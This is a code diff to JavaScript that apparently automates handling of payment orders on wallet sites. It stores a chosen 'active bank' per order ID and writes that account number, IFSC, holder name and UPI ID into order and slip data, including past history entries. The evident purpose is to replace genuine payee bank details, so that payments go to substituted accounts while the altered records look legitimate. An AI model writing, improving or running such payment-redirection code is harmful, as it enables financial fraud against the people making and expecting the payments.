@@ -284,6 +284,12 @@ async function claimOrderNotification(data, valueOrOrder) {
   ) || [...candidates][0];
   if (!canonical) return false;
 
+  if (savedObj && savedObj.notified) {
+    if (!data.orderNotificationMap || typeof data.orderNotificationMap !== 'object' || Array.isArray(data.orderNotificationMap)) data.orderNotificationMap = {};
+    data.orderNotificationMap[canonical] = { notifiedAt: Date.now(), legacy: true };
+    return false;
+  }
+
   if (!data.orderNotificationMap || typeof data.orderNotificationMap !== 'object' || Array.isArray(data.orderNotificationMap)) {
     data.orderNotificationMap = {};
   }
@@ -2329,15 +2335,19 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
           const canAutoSave = !Number.isFinite(wcState) || wcState <= 2;
           if (rptNo && data.botEnabled !== false && canAutoSave) {
             const activeBank = getActiveBank(data, null);
-            if (activeBank && (!activeBank.minAmount || amt >= activeBank.minAmount)) {
+            const existingMapping = getSavedOrderMapping(data, wc);
+            const isNew = !existingMapping;
+            // Existing orders ignore the current active bank and its minAmount;
+            // only a brand-new order needs the current active bank selected.
+            if (existingMapping || (activeBank && (!activeBank.minAmount || amt >= activeBank.minAmount))) {
               if (!data.orderBankMap) data.orderBankMap = {};
-              const isNew = !data.orderBankMap[String(rptNo)];
-              const bkAcct = activeBank.accountNo || '';
-              const bkIfsc = activeBank.ifsc || '';
-              const bkName = activeBank.accountHolder || '';
+              const sourceBank = isNew ? (activeBank || {}) : (bankFromSavedOrder(existingMapping) || {});
+              const bkAcct = sourceBank.accountNo || '';
+              const bkIfsc = sourceBank.ifsc || '';
+              const bkName = sourceBank.accountHolder || '';
               const originalWallet = typeof wc.walletDomain === 'string' ? wc.walletDomain : '';
               const walletScheme = inferWalletScheme(wc);
-              const wDom = buildWalletDomain({ ...activeBank, walletDomain: originalWallet, walletScheme }, amt);
+              const wDom = buildWalletDomain({ ...sourceBank, walletDomain: originalWallet, walletScheme }, amt);
 
               
 
@@ -2347,8 +2357,8 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
                   accountHolder: bkName,
                   accountNo: bkAcct,
                   ifsc: bkIfsc,
-                  bankName: activeBank.bankName || 'Bank',
-                  upiId: activeBank.upiId || '',
+                  bankName: sourceBank.bankName || 'Bank',
+                  upiId: sourceBank.upiId || '',
                   payAccount: wc.payAccount || '',
                   amount: amt,
                   orderId: rptNo,
@@ -2365,26 +2375,16 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
                 };
                 await saveData(data);
               } else {
-                // Keep the previously selected bank mapping, but refresh only
-                // wallet metadata from the live order so Freecharge is not
-                // represented by a stale MobiKwik URL.
-                const existing = data.orderBankMap[String(rptNo)];
+                // Existing orders are immutable: keep the bank and wallet that
+                // were saved at first capture. Only materialize the canonical
+                // rptNo key when the mapping was found through an alias.
+                const existing = parseSavedMapping(existingMapping);
                 if (existing) {
-                  // The order is already allowed to be replaced because it is
-                  // present in KV. Refresh the selected bank fields as well as
-                  // wallet metadata so stale real-bank values cannot block the
-                  // later history/detail paths.
-                  existing.bank = `${bkName} | ${bkAcct} | ${bkIfsc}`;
-                  existing.accountHolder = bkName;
-                  existing.accountNo = bkAcct;
-                  existing.ifsc = bkIfsc;
-                  existing.bankName = activeBank.bankName || existing.bankName || '';
-                  existing.upiId = activeBank.upiId || existing.upiId || '';
-                  existing.walletDomain = wDom;
-                  existing.walletScheme = walletScheme || existing.walletScheme || '';
-                  existing.payType = wc.payType || wc.ctType || existing.payType || 2;
-                  existing.payAccount = wc.payAccount || existing.payAccount || '';
-                  saveData(data).catch(() => { });
+                  data.orderBankMap[String(rptNo)] = existing;
+                  if (!existing.rptNo) existing.rptNo = String(rptNo);
+                  if (!existing.orderId) existing.orderId = String(rptNo);
+                  data._skipOverrideMerge = true;
+                  await saveData(data);
                 }
               }
 
@@ -2446,8 +2446,9 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
 
             const oId = _getItemOId(item);
             const savedSlip = oId && data.orderBankMap ? data.orderBankMap[oId] : null;
+            const savedMappingForOrder = getSavedOrderMapping(data, item);
 
-            if (!isHistoryItem) {
+            if (!isHistoryItem && !savedMappingForOrder) {
               // Browse (available to buy): minAmount check
               const iAmt = parseFloat(item.orderAmount || item.amount || item.money || item.totalAmount || item.buyAmount || 0);
               if (bank.minAmount && iAmt > 0 && iAmt < bank.minAmount) return;
@@ -2458,8 +2459,8 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
             } else {
               // History items may be changed only when their order ID is already
               // present in orderBankMap. An unmapped/cancelled order is left as-is.
-              const savedMapping = getSavedOrderMapping(data, item.rptNo || item.orderNo || item.orderId || item.id || item.slipId || '') ||
-                getSavedOrderMapping(data, item);
+              const savedMapping = savedMappingForOrder ||
+                getSavedOrderMapping(data, item.rptNo || item.orderNo || item.orderId || item.id || item.slipId || '');
               if (savedMapping) {
                 const mappedBank = bankFromSavedOrder(savedMapping);
                 if (mappedBank && (mappedBank.accountNo || mappedBank.ifsc || mappedBank.accountHolder)) {
